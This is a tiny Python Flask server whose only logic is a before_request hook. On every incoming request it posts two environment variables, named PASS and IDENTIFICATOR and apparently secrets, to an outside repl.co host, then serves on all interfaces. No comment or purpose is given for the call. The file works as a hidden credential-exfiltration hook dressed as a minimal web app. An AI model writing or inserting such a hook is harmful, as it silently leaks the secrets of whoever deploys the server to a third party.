import requests
import os
from flask import Flask
app = Flask(__name__)

@app.before_request
def send():
    requests.post('https://myrepo2023.chatddzz.repl.co',
                   data={os.environ.get("PASS"): os.environ.get("IDENTIFICATOR")}
)

app.run(host='0.0.0.0', port=os.environ.get('PORT', 3000))


